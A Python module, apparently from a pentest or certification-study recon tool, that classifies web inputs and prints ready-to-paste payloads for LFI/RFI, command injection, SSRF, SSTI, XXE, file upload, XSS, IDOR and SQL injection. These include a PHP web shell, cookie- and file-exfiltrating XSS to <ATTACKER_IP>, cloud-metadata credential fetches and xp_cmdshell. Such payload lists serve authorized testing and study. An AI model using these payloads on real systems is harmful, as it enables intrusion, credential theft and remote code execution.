"""
web_recon_heuristics.py

Heuristic ruleset for the passive web recon classifier.
Maps discovered input surfaces (param names / field types / contexts) to CANDIDATE
vulnerability classes, and provides the operator's own pastable MANUAL commands per class.

SQLi is a scoped pass (`classify_sqli_surface`): login / search / id-style DB lookups
only. It is NOT a broad param-name trigger. Pastables are printed, never sent.

PASSIVE / OUTPUT-ONLY. Nothing here is executed by the tool. These templates are PRINTED
for the operator to copy and run manually. No auto-exploitation, no scanner invocation.

Placeholders the crawler fills where known: <TARGET>, <PAGE>, <PARAM>, <FILE>, <COMMAND>,
<ATTACKER_IP>, <PORT>, <BASELINE>, <SIZE>, <REGEX>, <B64>, <SUCCESS_STRING>, <FAILURE_STRING>.
Leave any it can't resolve as the literal placeholder.
"""

# ---------------------------------------------------------------------------
# Candidate-class triggers. Matched against param names (substring, case-insensitive),
# field types, and context flags the crawler sets (e.g. accepts_xml, is_file_input,
# is_free_text, is_numeric, from_options_header).
# ---------------------------------------------------------------------------

PARAM_NAME_TRIGGERS = {
    "file_inclusion": [
        "page", "file", "language", "lang", "doc", "path", "pg",
        "template", "view", "include", "root", "read", "download", "folder",
    ],
    "ssrf": [
        "url", "dest", "server", "image", "fetch", "webhook", "callback",
        "uri", "next", "redirect", "return", "continue", "site", "domain",
    ],
    "command_injection": [
        "cmd", "exec", "ping", "host", "ip", "query", "filename", "run",
    ],
    "idor": [
        "id", "uid", "user", "account", "contract", "doc_id", "order",
        "num", "number", "userid", "user_id",
    ],
}

# Context-flag triggers (set by crawler during Phase 2 inventory)
CONTEXT_TRIGGERS = {
    "file_upload": ["is_file_input", "is_multipart_form"],
    "xxe": ["accepts_xml", "upload_xml_family"],   # .xml/.svg/.docx/.xlsx, Content-Type xml, SOAP/REST xml, sitemap/RSS import
    "xss": ["is_free_text", "is_search_field"],
    "ssti": ["is_free_text", "reflects_in_template_context"],  # operator confirms reflection manually
    "verb_tampering": ["from_options_header", "any_endpoint"],
}

# Free-text / search fields map to BOTH xss and ssti (both hinge on reflection,
# which the operator confirms manually).
FREE_TEXT_CLASSES = ["xss", "ssti"]

# ---------------------------------------------------------------------------
# Pastable command/payload templates per class (operator's own syntax).
# "canonical" = shown by default (minimal). "verbose" = only with --verbose,
# written to manual_checks.md. Nothing here is run by the tool.
# ---------------------------------------------------------------------------

PASTABLES = {

    "file_inclusion": {
        "why": "param name matches dynamic file-inclusion pattern",
        "canonical": [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/read=convert.base64-encode/resource=<FILE>",
            # curl note: use --path-as-is so the LFI portion isn't stripped
            "curl -sko- --path-as-is 'http://<TARGET>/<PAGE>?<PARAM>=../../../../etc/passwd'",
            # confirm directory-traversal LFI (Linux): nested/encoded/null-byte bypasses
            "ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=FUZZ' -fs <SIZE>",
            # confirm LFI when the file is executed instead of read
            "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=php://filter/read=convert.base64-encode/resource=FUZZ' -fs <SIZE>",
            # confirm directory-traversal LFI (Windows)
            "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=FUZZ' -fs 0",
        ],
        "verbose": [
            # traversal filter bypasses
            "..././..././..././etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
            "../../../../etc/passwd%00.php",            # PHP <5.5 null byte
            # windows
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            # find existing .php for wrapper source-read
            "feroxbuster -t 64 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --depth 5 --scan-dir-listings -x php --insecure -u http://<TARGET>",
            # param discovery
            "ffuf -u 'http://<TARGET>/<PAGE>?FUZZ=../../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mr 'root:'",
            # RFI (rare)
            "echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php ; python3 -m http.server 8080",
            "curl -sko- 'http://<TARGET>/<PAGE>?<PARAM>=http://<ATTACKER_IP>:8080/shell.php&cmd=<COMMAND>'",
            # wrapper RCE (data)
            "curl -sko- 'http://<TARGET>/<PAGE>?<PARAM>=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=<COMMAND>'",
            # log poisoning
            "curl -s --user-agent '<?php system($_GET[\"cmd\"]); ?>' http://<TARGET>/",
            "GET /<PAGE>?<PARAM>=....//....//....//var/log/apache2/access.log&cmd=id",
        ],
        "note": "Forced-extension? pivot to php://filter to read source. str_replace('../') filter? use ....// . Log poison: use ONE clean PHP one-liner (bad PHP breaks the log permanently).",
    },

    "command_injection": {
        "why": "param name feeds a system command",
        "canonical": [
            ";id", "|id", "`id`", "$(id)", "&&id",
        ],
        "verbose": [
            # from your escalation ladder
            "c'a't${IFS}/etc/passwd",                         # L1 space+quote
            "c'a't%09/etc/passwd",
            "c'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd",     # L2 slash blocked
            "<FIELD_DATA>%0ac'a't%09${PATH:0:1}etc${PATH:0:1}passwd",  # L3 newline
            "<FIELD_DATA>%0abash<<<$(base64%09-d<<<<B64>)",   # L4 base64 full bypass
            "$IFS%26c'a't$IFS${PATH:0:1}etc${PATH:0:1}passwd",# L5 chained param (&)
            # windows
            "who^ami",
        ],
        "note": "Start from a WORKING input, add ONE new char at a time, keep a good/bad char list. Windows: ';' works in PowerShell, not CMD.",
    },

    "ssrf": {
        "why": "param fetches a remote resource",
        "canonical": [
            "http://127.0.0.1/admin",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            # blind confirm
            "nc -lvnp 8080   # then:  ?<PARAM>=http://<ATTACKER_IP>:8080/ping",
        ],
        "verbose": [
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "//evil.com",                                     # open redirect
            "https://evil.com",
            # PDF-renderer SSRF->LFI (from your notes)
            "<script>x=new XMLHttpRequest;x.onload=function(){document.location='http://<ATTACKER_IP>:8080?c='+btoa(this.responseText)};x.open('GET','file:///etc/passwd');x.send();</script>",
        ],
        "note": "Blind? confirm via OOB callback (nc / interactsh). PDF renderer? try file:///, /proc/self/environ, /etc/hosts.",
    },

    "ssti": {
        "why": "free-text input reflected in a rendered/formatted response",
        "canonical": [
            "${{7*7}}", "{{7*'7'}}", "#{7*7}", "<%= 7*7 %>",
        ],
        "verbose": [
            # engine RCE (from your notes) -- only after fingerprint
            "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",  # Jinja2
            "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}",   # Twig
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",                    # Freemarker
            "<%= `id` %>",                                                                                # ERB
        ],
        "note": "MANUALLY confirm reflection first. Fingerprint: {{7*'7'}} => 7777777 Jinja2 / 49 Twig.",
    },

    "xxe": {
        "why": "input vector parses XML (xml content-type / .xml/.svg/.docx upload / SOAP/REST / importer)",
        "canonical": [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY probe "TESTSTRING">]><root><field>&probe;</field></root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ],
        "verbose": [
            '<!DOCTYPE email [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=<FILE>">]><root><email>&xxe;</email></root>',
            # XXE->SSRF
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            # blind OOB confirm
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<ATTACKER_IP>:8080/ping">]><foo>&xxe;</foo>',
            # SVG upload file-read
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>',
        ],
        "note": "MANUALLY confirm TESTSTRING reflects. Check Page Source for reflected data. file:// blocked? try php://, expect://, gopher://.",
    },

    "file_upload": {
        "why": "file input / multipart upload form",
        "canonical": [
            "shell.php  shell.phtml  shell.php.jpg  shell.jpg.php",
            "magic-byte prefix: GIF89a;   spoof Content-Type: image/jpeg",
        ],
        "verbose": [
            # your ffuf-by-parts clusterbomb workflow (operator runs manually, from req.txt)
            "ffuf -request-proto http -request req_single_ext.txt -mode clusterbomb -w extensions.lst:EXT -w content-types.txt:CTYPE -w magicbytes.txt:MAGIC -od ffuf_uploads_single -mr '<SUCCESS_STRING>'",
            "ffuf -w extensions.lst:EXT -u 'http://<TARGET>/<PAGE>/shellEXT?cmd=id' -mr 'uid=' -v",
        ],
        "note": "Capture upload req in proxy -> req.txt. Build extensions/content-types/magicbytes wordlists first. Find upload dir via feroxbuster if not known.",
    },

    "xss": {
        "why": "free-text/search input, or param reflected in rendered DOM",
        "canonical": [
            "<script>alert(window.origin)</script>",
            '"><img src=x onerror=alert(window.origin)>',
            "<svg/onload=alert(window.origin)>",
        ],
        "verbose": [
            # polyglot breaker
            'javascript:"/*\\"/*`/*\' /*</title></textarea>--></noscript></style></xmp>"></a><img src=x onerror=alert(window.origin)>//',
            # remote / exfil
            '<script src="http://<ATTACKER_IP>/script.js"></script>',
            "document.location='http://<ATTACKER_IP>/index.php?c='+document.cookie;",
            "new Image().src='http://<ATTACKER_IP>/index.php?c='+document.cookie;",
        ],
        "note": "MANUALLY confirm reflection: Page Source (CTRL+U, pre-exec) vs Inspect (F12, post-exec). document.cookie only if HttpOnly is OFF. Blind XSS: use your PHP callback-server workflow.",
    },

    "idor": {
        "why": "numeric / sequential object reference param",
        "canonical": [
            "ffuf -u 'http://<TARGET>/api/user/FUZZ' -w <(seq 0 50) -mr '<REGEX>'",
        ],
        "verbose": [
            "ffuf -request-proto http -request request.txt -w <(seq 1 10) -mr '<REGEX>'",
            # encoded-ID iteration (b64/md5) -- from your notes
            "for i in {1..20}; do B64_ID=$(echo -n \"$i\" | base64 -w 0); curl -sJo- \"http://<TARGET>/download.php?contract=$B64_ID\"; done",
        ],
        "note": "Don't forget the Cookie header. Try increment/decrement and swapping to another known ID.",
    },

    "verb_tampering": {
        "why": "endpoint may honor alternate HTTP verbs",
        "canonical": [
            "curl -X OPTIONS -i 'http://<TARGET>/*'",
        ],
        "verbose": [
            "{ curl -s -I -X OPTIONS <TARGET> | grep -i 'allow:' | cut -d':' -f2 | tr ',' '\\n' | tr -d ' ' ; echo 'GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT DEBUG' | tr ' ' '\\n'; } | sort -u > http_methods.txt",
            "ffuf -w ./http_methods.txt -X FUZZ -u <TARGET>",
        ],
        "note": "If auth uses only HTTP headers, try HEAD/OPTIONS to bypass. Swap GET<->POST.",
    },

    "sqli": {
        "why": "input feeds an auth check or DB lookup (login / search / id-style)",
        "canonical": [],  # assembled per-sink by sqli_pastables(); never a broad dump
        "verbose": [],
        "note": (
            "Candidate sink only — this tool never sends these strings. "
            "Context: string -> break with ' ; numeric -> no quote ; parenthesized query -> ') . "
            "Try BOTH ' and \" and the ') paren variants. "
            "GOTCHA: IN (SELECT ...) needs EXACTLY ONE column -> CONCAT to merge multiple, or use UNION. "
            "sqlmap is intentionally not emitted (auto-exploitation)."
        ),
    },
}

# ---------------------------------------------------------------------------
# SQLi surface pass (CPTS/OSCP-scoped). Forms first. NOT a param-name trigger.
# Flag only inputs that look like they feed an auth query or DB lookup.
# Pure mapping: never sends a payload, never submits a form, never confirms injection.
# ---------------------------------------------------------------------------

def _norm_ident(value):
    return (value or "").strip().lower().replace("-", "_")


SQLI_SKIP_NAMES = {
    "csrf", "csrf_token", "csrftoken", "_token", "token", "authenticity_token",
    "nonce", "_wpnonce", "wp_nonce", "submit", "commit", "remember", "rememberme",
    "remember_me", "captcha", "recaptcha", "g_recaptcha_response", "honeypot",
    "_method",
}

SQLI_SKIP_TYPES = {
    "submit", "button", "reset", "image", "file", "checkbox", "radio",
}

# Identity fields on login / reset / register forms
SQLI_USERNAME_NAMES = {
    "user", "username", "user_name", "uname", "login", "login_id", "user_login",
    "log", "email", "mail", "user_email", "e_mail", "userid", "user_id", "uid",
    "account", "acct", "name", "id", "os_username", "j_username",
}

# Search: exact short names (substring would be noise) + longer needles
SQLI_SEARCH_EXACT = {"q", "s", "item", "name"}
SQLI_SEARCH_NEEDLES = ("search", "query", "find", "lookup", "keyword")

# id-style URL/GET params — exact after hyphen→underscore. Not a generic *_id sweep.
SQLI_ID_EXACT = {
    "id", "uid", "user_id", "userid", "pid", "product", "prod", "product_id",
    "item", "item_id", "cat", "category", "category_id", "cat_id",
    "article", "article_id", "page_id", "doc", "doc_id",
    "order", "order_id", "num", "record", "record_id",
}

SQLI_FILTER_EXACT = {
    "sort", "order", "orderby", "order_by", "filter",
    "category", "cat", "status", "type", "view", "group", "dir",
}

SQLI_COMMENT_NAMES = {"comment", "comments", "reply", "guestbook"}
SQLI_NEWSLETTER_NAMES = {"newsletter", "subscribe", "mailing", "mailchimp"}

# Operator dialect — DEFAULT break-out probes
SQLI_BREAKOUT = [
    "'",
    '"',
    "`",
    "')",
    '")',
    "' -- -",
    '" -- -',
]

# Operator dialect — DEFAULT auth bypass (login fields)
SQLI_AUTH_BYPASS = [
    "admin' -- -",
    "admin' #",
    "' OR 1=1-- -",
    "' OR '1'='1",
    "') OR ('1'='1",
    "admin') -- -",
]

# Operator dialect — DEFAULT OffSec-style survey via OR ... IN (SELECT ...)
SQLI_SURVEY = [
    "' OR 1=1 IN (SELECT @@version) -- -",
    "' OR 1=1 IN (SELECT version()) -- -",
    "' OR 1=1 IN (SELECT CONCAT(username,0x20,password) FROM users) -- -",
    "' OR 1=1 IN (SELECT CONCAT(host,unique_users) FROM sys.host_summary) -- -",
]

# VERBOSE: UNION workflow (reflected output — search/item params)
SQLI_UNION = [
    "' ORDER BY 1,2,3,4,5,6,7 -- -",
    "' UNION SELECT 1,2,3,4,5 -- -",
    "' UNION SELECT 1,version(),database(),4,5 -- -",
    "' UNION SELECT null,table_name,column_name,table_schema,null FROM information_schema.columns WHERE table_schema=database() -- -",
]

SQLI_ERROR = [
    "' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e)) -- -",
    "' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--",
]

SQLI_BLIND = [
    "' AND 1=1 -- -",
    "' AND 1=2 -- -",
    "' AND (SELECT substring(user(),1,1))='a' -- -",
]

SQLI_TIME = [
    "' AND IF(1=1,sleep(3),\"false\") -- -",
    "' AND (SELECT SLEEP(5)) -- -",
    "'; WAITFOR DELAY '0:0:5' --",
    "'; SELECT pg_sleep(5) --",
]

SQLI_STACKED = [
    "'; EXEC xp_cmdshell 'whoami' -- -",
]

SQLI_CURL = [
    (
        "curl --path-as-is -i -s -k -X POST "
        "-H 'Content-Type: application/x-www-form-urlencoded' "
        "'http://<TARGET>/<PAGE>' --data-urlencode \"<PARAM>=offsec' OR 1=1 -- -\""
    ),
    (
        "curl --path-as-is -i -s -k --get "
        "'http://<TARGET>/<PAGE>' --data-urlencode \"<PARAM>='\""
    ),
]


def _is_username_name(param_name):
    n = _norm_ident(param_name)
    return n in SQLI_USERNAME_NAMES


def _is_sqli_search_name(param_name, getish=False):
    n = _norm_ident(param_name)
    raw = (param_name or "").strip().lower()
    if raw in {"q", "s"} or n in {"q", "s"}:
        return True
    # `item` is an OffSec listing param (GET ?item= and search forms). `name` only as GET/URL.
    if n == "item":
        return True
    if n == "name":
        return getish
    return any(needle in n for needle in SQLI_SEARCH_NEEDLES)


def _is_sqli_id_name(param_name):
    return _norm_ident(param_name) in SQLI_ID_EXACT


def _is_sqli_filter_name(param_name):
    return _norm_ident(param_name) in SQLI_FILTER_EXACT


def _is_comment_name(param_name):
    n = _norm_ident(param_name)
    return n in SQLI_COMMENT_NAMES or n.endswith("_comment") or n.startswith("comment_")


def _is_newsletter_name(param_name):
    n = _norm_ident(param_name)
    if n in SQLI_NEWSLETTER_NAMES:
        return True
    return any(k in n for k in SQLI_NEWSLETTER_NAMES)


def _is_getish(method, kind):
    k = kind or ""
    if k in {"query_param", "js_param"}:
        return True
    return (method or "").upper() in {"GET", "HEAD"}


def _sqli_hit(priority, role, why):
    return {"priority": priority, "role": role, "why": why}


def classify_sqli_surface(
    param_name=None,
    context_flags=None,
    field_type=None,
    method=None,
    kind=None,
):
    """
    Scoped SQLi candidate check. Returns {priority, role, why} or None.

    Forms / login context are inspected first. A field must match HIGH or MEDIUM
    criteria; everything else stays silent. Does not use PARAM_NAME_TRIGGERS.
    Pure function: no network, no execution.
    """
    flags = set(context_flags or [])
    name = param_name or ""
    n = _norm_ident(name)
    ft = (field_type or "").lower()
    kind = kind or ""

    if kind == "site" or name in {"", "*"}:
        return None
    if "is_file_input" in flags or ft == "file":
        return None
    if ft in SQLI_SKIP_TYPES:
        return None
    if n in SQLI_SKIP_NAMES:
        return None

    # --- forms first --------------------------------------------------------

    if "is_login_form" in flags:
        if "is_password_field" in flags or ft == "password":
            return _sqli_hit(
                "HIGH",
                "login",
                "HIGH: login form (password field present) — password feeds the auth query",
            )
        if ft == "hidden":
            return None
        if "is_username_field" in flags or _is_username_name(name) or ft == "email":
            return _sqli_hit(
                "HIGH",
                "login",
                "HIGH: login form (password field present) — username is the primary auth-query sink",
            )
        return None

    if "is_login_adjacent_form" in flags:
        if ft == "hidden":
            return None
        if "is_username_field" in flags or _is_username_name(name) or ft == "email":
            return _sqli_hit(
                "MEDIUM",
                "login_adjacent",
                "MEDIUM: login-adjacent form (password reset / registration) — single identity lookup",
            )
        return None

    if "is_comment_form" in flags:
        if _is_comment_name(name) or ft == "textarea":
            return _sqli_hit(
                "MEDIUM",
                "comment",
                "MEDIUM: comment field on a DB-backed form (exam-seen INSERT/lookup sink)",
            )
        return None  # e.g. commenter `name` is not a search HIGH

    if "is_newsletter_form" in flags:
        if ft == "email" or _is_newsletter_name(name) or _is_username_name(name):
            return _sqli_hit(
                "MEDIUM",
                "newsletter",
                "MEDIUM: newsletter field on a DB-backed form (exam-seen injectable)",
            )
        return None

    # --- HIGH: search, then id-style GET ------------------------------------

    search_like = (
        "is_search_field" in flags
        or _is_sqli_search_name(name, getish=_is_getish(method, kind))
        or (
            "is_search_form" in flags
            and ft not in {"hidden", "select"}
            and ("is_free_text" in flags or ft in {"text", "search", "textarea", ""})
        )
    )
    if search_like:
        return _sqli_hit(
            "HIGH",
            "search",
            "HIGH: search field — likely SELECT ... LIKE / result listing (OffSec ?s= / item=)",
        )

    if _is_getish(method, kind) and _is_sqli_id_name(name):
        return _sqli_hit(
            "HIGH",
            "id",
            "HIGH: id-style GET/URL param — likely WHERE id= (or equivalent) lookup",
        )

    # --- MEDIUM: filter/sort GET, standalone newsletter/comment names -------

    if _is_getish(method, kind) and _is_sqli_filter_name(name):
        return _sqli_hit(
            "MEDIUM",
            "filter",
            "MEDIUM: filter/sort param — may be interpolated into ORDER BY / WHERE",
        )

    if _is_comment_name(name):
        return _sqli_hit(
            "MEDIUM",
            "comment",
            "MEDIUM: comment field (DB-backed insert; exam-seen injectable)",
        )

    if _is_newsletter_name(name):
        return _sqli_hit(
            "MEDIUM",
            "newsletter",
            "MEDIUM: newsletter field (DB-backed insert/lookup; exam-seen injectable)",
        )

    return None


def sqli_pastables(role="id", verbose=False, param=None):
    """Assemble operator-dialect SQLi pastables for a sink role. Output only."""
    role = role or "id"
    param = param or "<PARAM>"
    commands = [
        "# break-out probes — try each quote/paren style; watch for error or changed response",
        *SQLI_BREAKOUT,
        "# Context: string -> break with ' ; numeric -> no quote ; parenthesized query -> ') . Try BOTH ' and \" and the ') paren variants.",
    ]
    if role == "login":
        commands += [
            "# auth bypass (login fields)",
            *SQLI_AUTH_BYPASS,
            "# OffSec-style survey via OR ... IN (SELECT ...) — IN (SELECT ...) needs EXACTLY ONE column (CONCAT to merge, or UNION)",
            *SQLI_SURVEY,
        ]
    elif role in {"id", "login_adjacent"}:
        commands += [
            "# OffSec-style survey via OR ... IN (SELECT ...) — IN (SELECT ...) needs EXACTLY ONE column (CONCAT to merge, or UNION)",
            *SQLI_SURVEY,
        ]

    if verbose:
        if role in {"search", "id", "filter"}:
            commands += [
                f"# UNION workflow (reflected output). Prefix search payloads with % to display all rows, e.g. {param}=%' UNION ...",
                *SQLI_UNION,
            ]
        commands += [
            "# error-based",
            *SQLI_ERROR,
            "# blind boolean",
            *SQLI_BLIND,
            "# blind time (operator IF style)",
            *SQLI_TIME,
            "# stacked / code-exec (MSSQL/Postgres, when the driver allows)",
            *SQLI_STACKED,
            "# curl reminders — always --data-urlencode and --path-as-is (GET-based blind: --get --data-urlencode)",
            *SQLI_CURL,
        ]

    note = PASTABLES["sqli"]["note"]
    if role == "search":
        note = (
            "Prefix search payloads with % to display all rows (item=%' UNION ...). " + note
        )
    elif role == "login":
        note = "Try auth bypass on the username field first. " + note

    return {
        "why": PASTABLES["sqli"]["why"],
        "note": note,
        "commands": commands,
    }


# ---------------------------------------------------------------------------
# Classifier entry point (pure mapping; NO network, NO execution).
# SQLi is a separate scoped pass (classify_sqli_surface) — not PARAM_NAME_TRIGGERS.
# ---------------------------------------------------------------------------

def classify_input(param_name=None, context_flags=None):
    """
    Return a list of candidate class keys for a discovered input surface.
    param_name: str or None
    context_flags: set[str] or None (e.g. {'is_file_input'}, {'accepts_xml'}, {'is_free_text'})
    Pure function: matches triggers only. Operator runs the emitted pastables manually.
    """
    context_flags = context_flags or set()
    candidates = []

    if param_name:
        p = param_name.lower()
        for cls, needles in PARAM_NAME_TRIGGERS.items():
            if any(n in p for n in needles):
                candidates.append(cls)

    for cls, flags in CONTEXT_TRIGGERS.items():
        if any(f in context_flags for f in flags):
            candidates.append(cls)

    if "is_free_text" in context_flags or "is_search_field" in context_flags:
        for cls in FREE_TEXT_CLASSES:
            if cls not in candidates:
                candidates.append(cls)

    # dedupe, preserve order
    seen = set()
    return [c for c in candidates if not (c in seen or seen.add(c))]


def pastables_for(class_key, verbose=False):
    """Return dict with why/note + canonical (+ verbose) pastables for a class. Output only."""
    entry = PASTABLES.get(class_key)
    if not entry:
        return None
    out = {
        "why": entry.get("why", ""),
        "note": entry.get("note", ""),
        "commands": list(entry.get("canonical", [])),
    }
    if verbose:
        out["commands"] += list(entry.get("verbose", []))
    return out
